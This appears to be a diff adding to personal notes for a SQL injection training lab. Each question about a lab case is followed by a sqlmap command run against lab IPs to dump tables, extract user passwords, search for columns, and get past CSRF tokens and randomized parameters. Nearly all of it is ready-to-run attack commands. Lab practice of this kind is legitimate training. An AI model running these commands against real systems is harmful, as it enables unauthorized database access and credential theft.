@@ -164,4 +164,15 @@ What's the contents of table flag6? (Case #6) = Detect and exploit SQLi vulnerab
 sqlmap -u http://167.71.138.188:30700/case6.php?col=id --prefix='`)' --batch --dump
 What's the contents of table flag7? (Case #7) = Detect and exploit SQLi vulnerability in GET parameter id by usage of UNION query-based technique
 qlmap -u http://167.71.138.188:30700/case7.php?id=1 --union-cols=5 --batch --dump
+What's the contents of table flag1 in the testdb database? (Case #1) = Detect and exploit SQLi vulnerability in GET parameter id
+sqlmap -u "http://167.71.138.188:31784/case1.php?id=1" --banner --current-user --current-db --is-dba --batch --dump
+What's the name of the column containing "style" in it's name? (Case #1) = Detect and exploit SQLi vulnerability in GET parameter id
+sqlmap -u "http://165.22.126.213:31234/case1.php?id=1" --search -C style 
+What's the Kimberly user's password? (Case #1)
+sqlmap -u "http://165.22.126.213:31234/case1.php?id=1" --passwords --batch --dump
+sqlmap -u "http://165.22.126.213:32170/case8.php" -randomize=rp --batch -v 5 | grep URI
+What's the contents of table flag8? (Case #8)
+sqlmap -u "http://165.22.126.213:32170/case8.php" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+sqlmap -u "http://165.22.126.213:32170/case8.php/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
 
+What's the contents of table flag9? (Case #9)
